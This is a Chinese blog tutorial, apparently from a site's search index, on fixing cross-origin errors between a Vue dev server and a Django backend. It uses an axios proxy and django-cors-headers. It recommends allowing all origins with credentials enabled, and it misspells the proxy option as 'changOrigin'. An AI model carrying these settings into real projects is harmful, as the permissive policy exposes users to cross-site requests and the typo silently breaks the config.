+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Vue-Django前后端开发"><a href="#Vue-Django前后端开发" class="headerlink" title="Vue+Django前后端开发"></a>Vue+Django前后端开发</h1><p>当我们从零开始利用Vue和Django开发的时候，就会遇到跨域问题，一般来说Vue本地端口可以是8080或者其它，Django的本地端口一般是8000。<br>虽然在Vue中我们用axios 向8000端口发送http请求，但还是收到跨域访问的限制<br>这里分别从前后端说明该如何配置，解决跨域问题</p>
+<h2 id="前端Vue配置"><a href="#前端Vue配置" class="headerlink" title="前端Vue配置"></a>前端Vue配置</h2><h3 id="1-config-index-js"><a href="#1-config-index-js" class="headerlink" title="1. config&#x2F;index.js"></a>1. config&#x2F;index.js</h3><p>基于封装好的axios来进行跨域<br>在前端config&#x2F;index.js中,设置proxy进行跨域</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">devServer</span>:&#123;</span><br><span class="line">      <span class="attr">proxy</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>:&#123;<span class="comment">//表示拦截以/api开头的请求路径</span></span><br><span class="line">          <span class="attr">target</span>:<span class="string">&#x27;http://127.0.0.1:8000&#x27;</span>,</span><br><span class="line">          <span class="attr">changOrigin</span>: <span class="literal">true</span>,<span class="comment">//是否开启跨域</span></span><br><span class="line">          <span class="attr">pathRewrite</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>:<span class="string">&#x27;&#x27;</span> <span class="comment">//重写api，把api变成空字符，因为我们真正请求的路径是没有api的</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-axios的封装文件"><a href="#2-axios的封装文件" class="headerlink" title="2. axios的封装文件"></a>2. axios的封装文件</h3><p>建立一个json文件，对axios.create进行封装的时候，将其baseURL设置为api，如下所示</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">50000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="后端Django配置"><a href="#后端Django配置" class="headerlink" title="后端Django配置"></a>后端Django配置</h2><h3 id="1-安装django-cors-headers库"><a href="#1-安装django-cors-headers库" class="headerlink" title="1. 安装django-cors-headers库"></a>1. 安装django-cors-headers库</h3><p>在python环境下直接pip install 进行安装</p>
+<h3 id="2-设置setting-py文件"><a href="#2-设置setting-py文件" class="headerlink" title="2. 设置setting.py文件"></a>2. 设置setting.py文件</h3><p>在setting.py中，在INSTALLED_APPS中添加跨域所需的APP<code>corsheaders</code>,同时在MIDDLEWARE中也添加响应的中间件，并将允许跨域请求的请求方式进行设置，设置为ALL</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">&#x27;corsheaders.middleware.CorsMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = <span class="literal">True</span></span><br><span class="line">CORS_ALLOW_CREDENTIALS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<p>如果前后端都进行了这样的设置之后，应该前后端就能够进行数据的交互了！</p>
+]]></content>
+      <categories>
+        <category>前后端</category>
+      </categories>
+      <tags>
+        <tag>前后端</tag>
       </tags>
   </entry>
   <entry>
